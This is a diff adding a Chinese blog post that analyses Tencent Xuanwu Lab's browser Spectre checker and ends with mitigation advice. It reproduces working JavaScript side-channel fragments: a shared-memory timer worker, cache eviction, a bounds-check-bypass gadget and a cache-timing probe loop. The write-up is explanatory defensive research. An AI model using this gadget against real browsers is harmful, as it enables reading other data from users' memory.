@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="cpu漏洞,spectre,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="检测地址（也是分析的来源）：http://xlab.tencent.com/special/spectre/spectre_check.html 首先判断是否启用了window.SharedArrayBuffer，如果没有启用的话就直接输出不容易受到攻击 1234567891011121314151617function main()&amp;#123;    output_testing_start()">
+<meta name="keywords" content="cpu漏洞,spectre">
+<meta property="og:type" content="article">
+<meta property="og:title" content="腾讯玄武实验室检测浏览器spectre的原理">
+<meta property="og:url" content="https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="检测地址（也是分析的来源）：http://xlab.tencent.com/special/spectre/spectre_check.html 首先判断是否启用了window.SharedArrayBuffer，如果没有启用的话就直接输出不容易受到攻击 1234567891011121314151617function main()&amp;#123;    output_testing_start()">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1515477741462.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1515477760612.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1515477891996.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1515477932241.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1515481162592.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="腾讯玄武实验室检测浏览器spectre的原理">
+<meta name="twitter:description" content="检测地址（也是分析的来源）：http://xlab.tencent.com/special/spectre/spectre_check.html 首先判断是否启用了window.SharedArrayBuffer，如果没有启用的话就直接输出不容易受到攻击 1234567891011121314151617function main()&amp;#123;    output_testing_start()">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1515477741462.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/">
+
+
+
+
+
+  <title>腾讯玄武实验室检测浏览器spectre的原理 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">腾讯玄武实验室检测浏览器spectre的原理</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-09T00:00:00+00:00">
+                2018-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>检测地址（也是分析的来源）：<a href="http://xlab.tencent.com/special/spectre/spectre_check.html" target="_blank" rel="noopener">http://xlab.tencent.com/special/spectre/spectre_check.html</a></p>
+<p>首先判断是否启用了window.SharedArrayBuffer，如果没有启用的话就直接输出不容易受到攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    output_testing_start();</span><br><span class="line">    // 如果不支持window.SharedArrayBuffer直接就输出不受漏洞影响了</span><br><span class="line">    // 有了 SharedArrayBuffer 后，多个 web worker 就可以同时读写同一块内存了</span><br><span class="line">    // 这种同时访问也有风险，会产生竞争条件</span><br><span class="line">    if(window.SharedArrayBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(&quot;cache : 8&quot;);</span><br><span class="line">        output_cache_log(8);</span><br><span class="line">        check(8, [88,117,97,110,119,117]);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        output_not_info_leak();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假如是chrome可以在地址栏输入下面的进行开启和关闭（google为了防止利用直接云端控制将这个flag默认关闭了——来自tk微博评论）</p>
+<p>chrome://flags/#shared-array-buffer</p>
+<p><img src="http://pic.giantbranch.cn/pic/1515477741462.jpg" alt></p>
+<p>关闭状态</p>
+<p><img src="http://pic.giantbranch.cn/pic/1515477760612.jpg" alt></p>
+<p>开启状态</p>
+<p><img src="http://pic.giantbranch.cn/pic/1515477891996.jpg" alt></p>
+<p>开启后即可检测出存在风险，并在16M缓存的时候可以成功泄露</p>
+<p><img src="http://pic.giantbranch.cn/pic/1515477932241.jpg" alt></p>
+<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>新建一个Worker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const worker = new Worker(&apos;/special/spectre/js/worker.js&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>其中worker代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;message&apos;, function (event)</span><br><span class="line">&#123;</span><br><span class="line">    const sharedBuffer = event.data;</span><br><span class="line">    const sharedArray = new Uint32Array(sharedBuffer);</span><br><span class="line">    postMessage(&apos;start&apos;);</span><br><span class="line">    while(true)</span><br><span class="line">        Atomics.add(sharedArray,0,1); //使用 Atomics.add，加法执行过程中不会因为多线程而被打乱。</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>其中message事件是处理postMessage的</p>
+<p>Atomics.add方法原型<br>Atomics.add(typedArray, index, value)<br>更多请看<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Atomics/add" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Atomics/add</a></p>
+<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>新建了一个SharedArrayBuffer，并作为普通Array的参数new了一下，之后postMessage触发Worker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);</span><br><span class="line">const sharedArray = new Uint32Array(sharedBuffer);</span><br><span class="line">worker.postMessage(sharedBuffer);</span><br></pre></td></tr></table></figure>
+
+<p>接下来是new了一个 num * 1024 * 1024的evictionBuffer（num一开始是8，失败后就将num*2再尝试利用，最多是256，即256M的缓存测试），利用这个buffer再new一个DataView，之后flush掉evictionView</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var offset = 64;</span><br><span class="line">var current;</span><br><span class="line">var cache_size = num * 1024 * 1024;</span><br><span class="line">var evictionBuffer = new ArrayBuffer(cache_size);</span><br><span class="line">var evictionView = new DataView(evictionBuffer);</span><br><span class="line">clflush(cache_size);</span><br></pre></td></tr></table></figure>
+
+<p>之后初始化asmModule这个类（其中probeTable是0x3000000大小），并调用init方法</p>
+<p>var asm = asmModule(this,{},probeTable.buffer)<br>asm.init();</p>
+<p>init是初始化simpleByteArray</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function init()</span><br><span class="line">    &#123;</span><br><span class="line">        var i =0;</span><br><span class="line">        var j =0;</span><br><span class="line">        for(i=0; (i|0)&lt;16; i=(i+1)|0 )</span><br><span class="line">            simpleByteArray[i|0] = ((i|0)+1)|0;</span><br><span class="line">        for(i=0; (i|0)&lt;30; i=(i+1)|0 )</span><br><span class="line">        &#123;</span><br><span class="line">            j = ((((i|0)*8192)|0) +  0x1000000)|0</span><br><span class="line">            simpleByteArray[(j|0)] = 0x10;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是初始化后的结果</p>
+<p><img src="http://pic.giantbranch.cn/pic/1515481162592.jpg" alt></p>
+<p>设置simpleByteArray偏移0x2200000+i的值分别为88,117,97,110,119,117（即Xuanwu的ascii码）<br>这是为了模拟在内存中存储的密码等信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var simpleByteArray = new Uint8Array(probeTable.buffer);</span><br><span class="line">for(var i=0;i&lt;data_array.length;i++)</span><br><span class="line">	simpleByteArray[0x2200000 + i] = data_array[i];</span><br></pre></td></tr></table></figure>
+
+<h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><p>最后通过侧信道的攻击方式“读取”0x2200000+i那边的内存，跟我们之前写进去的比较，如果“读”出来的是正确的，那说明我们可以成功泄露了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;data_array.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            var data = readMemoryByteWrapper(0x2200000+i);</span><br><span class="line">            if (data != data_array[i])</span><br><span class="line">            &#123;</span><br><span class="line">                worker.terminate();</span><br><span class="line"></span><br><span class="line">                if((num*2) &lt; 256)</span><br><span class="line">                &#123;</span><br><span class="line">                    console.log();</span><br><span class="line">                    console.log(&quot;cache : &quot;+ num*2);</span><br><span class="line">                    output_cache_log(num*2);</span><br><span class="line">                    check(num*2, data_array);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    output_not_info_leak();</span><br><span class="line">                &#125;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                var infor_string = &quot;\&quot;&quot;+String.fromCharCode(data)+&quot;\&quot; : &quot;+ data;</span><br><span class="line">                console.log(infor_string);</span><br><span class="line">                is_reset = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们具体看看readMemoryByteWrapper，实际这个函数是调用readMemoryByte进行“读取”，假如读取不成功便尝试继续读取</p>
+<h1 id="readMemoryByte"><a href="#readMemoryByte" class="headerlink" title="readMemoryByte"></a>readMemoryByte</h1><p>我们重点看下readMemoryByte函数，关键是这两个循环</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">for (var j = 29; j &gt;= 0; j--)</span><br><span class="line">&#123; </span><br><span class="line">    for ( var z = 0; z &lt; 100; z++) &#123;&#125;</span><br><span class="line">    var x = ((j % 6) - 1) &amp; ~0xFFFF; </span><br><span class="line">    x = (x | (x &gt;&gt; 16)); </span><br><span class="line">    x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line">    asm.vul_call(x,j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 256; i++)</span><br><span class="line">&#123;</span><br><span class="line">    var mix_i = i;</span><br><span class="line">    var timeS = start();</span><br><span class="line">    junk =  probeTable[(mix_i * TABLE1_STRIDE)];</span><br><span class="line">    timeE = now();</span><br><span class="line">    if (timeE-timeS &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != simpleByteArray[tries % simpleByteArrayLength])</span><br><span class="line">        results[mix_i]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于第一个循环我们关注asm.vul_call(x,j);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function vul_call(index, sIndex)</span><br><span class="line">&#123;</span><br><span class="line">    index = index |0;</span><br><span class="line">    sIndex = sIndex |0;        </span><br><span class="line">    var arr_size = 0;</span><br><span class="line">    var j = 0;</span><br><span class="line">    junk = probeTable[0]|0;</span><br><span class="line">    j = ((((sIndex|0)*8192)|0) +  0x1000000)|0;</span><br><span class="line">    arr_size = simpleByteArray[(j|0)]|0;</span><br><span class="line">    if ((index|0) &lt; (arr_size|0)) &#123;</span><br><span class="line">        index = simpleByteArray[index|0]|0;</span><br><span class="line">        index = ((index * 0x1000)|0);</span><br><span class="line">        index = (index &amp; ((0x2000000-1)|0))|0;</span><br><span class="line">        junk = (junk ^ (probeTable[index]|0))|0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个其实跟meldown的利用方式是相似的，简化一下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function vul_call(index, sIndex)</span><br><span class="line">&#123;        </span><br><span class="line">    var arr_size = 0;</span><br><span class="line">    var j = 0;</span><br><span class="line">    junk = probeTable[0];</span><br><span class="line">    j = ((((sIndex)*8192)) +  0x1000000);</span><br><span class="line">    arr_size = simpleByteArray[(j)];</span><br><span class="line">    if ((index) &lt; (arr_size)) &#123;</span><br><span class="line">        index = simpleByteArray[index];</span><br><span class="line">        index = ((index * 0x1000));</span><br><span class="line">        index = (index &amp; ((0x2000000-1)));</span><br><span class="line">        junk = (junk ^ (probeTable[index]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先读取simpleByteArray里面的值，作为index（索引）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index = simpleByteArray[index];</span><br><span class="line">index = ((index * 0x1000));</span><br><span class="line">index = (index &amp; ((0x2000000-1)));</span><br></pre></td></tr></table></figure>
+
+<p>之后将probeTable利用这个索引跟junk异或，这样probeTable[index]就被缓存下来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junk = (junk ^ (probeTable[index]));</span><br></pre></td></tr></table></figure>
+
+<p>接下来看第二个循环，其中TABLE1_STRIDE为0x1000，跟上面是遥相呼应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; 256; i++)</span><br><span class="line">&#123;</span><br><span class="line">    var mix_i = i;</span><br><span class="line">    var timeS = start();</span><br><span class="line">    junk =  probeTable[(mix_i * TABLE1_STRIDE)];</span><br><span class="line">    timeE = now();</span><br><span class="line">    if (timeE-timeS &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != simpleByteArray[tries % simpleByteArrayLength])</span><br><span class="line">        results[mix_i]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一旦读取出来probeTable[(mix_i * TABLE1_STRIDE)];的值的时间小于CACHE_HIT_THRESHOLD（就是可以去区分从cached和uncached读取时间的阀值，大于它就是uncached的，否则是cached）</p>
+<p>一旦是cached的，说明当前的mix_i就是侧信道泄露出来的值，即Array中的这些值[88,117,97,110,119,117]</p>
+<p>而results[mix_i]++就是储存100次尝试中成功泄露该位的次数</p>
+<h1 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h1><p>禁用SharedArrayBuffer</p>
+<p>既然都禁用这个了，那么含有这个利用的关键词就可以拦截了：</p>
+<p>SharedArrayBuffer</p>
+<h1 id="references"><a href="#references" class="headerlink" title="references"></a>references</h1><p><a href="http://xlab.tencent.com/special/spectre/spectre_check.html" target="_blank" rel="noopener">http://xlab.tencent.com/special/spectre/spectre_check.html</a><br><a href="https://segmentfault.com/a/1190000006061528" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006061528</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/" title="腾讯玄武实验室检测浏览器spectre的原理">https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/cpu漏洞/" rel="tag"># cpu漏洞</a>
+          
+            <a href="/tags/spectre/" rel="tag"># spectre</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/02/CVE-2010-3974-Microsoft_Windows_传真封面编辑器双重释放漏洞/" rel="next" title="CVE-2010-3974-Microsoft Windows 传真封面编辑器双重释放漏洞">
+                <i class="fa fa-chevron-left"></i> CVE-2010-3974-Microsoft Windows 传真封面编辑器双重释放漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/09/对CPU漏洞Meltdown的理解/" rel="prev" title="对CPU漏洞Meltdown的理解">
+                对CPU漏洞Meltdown的理解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
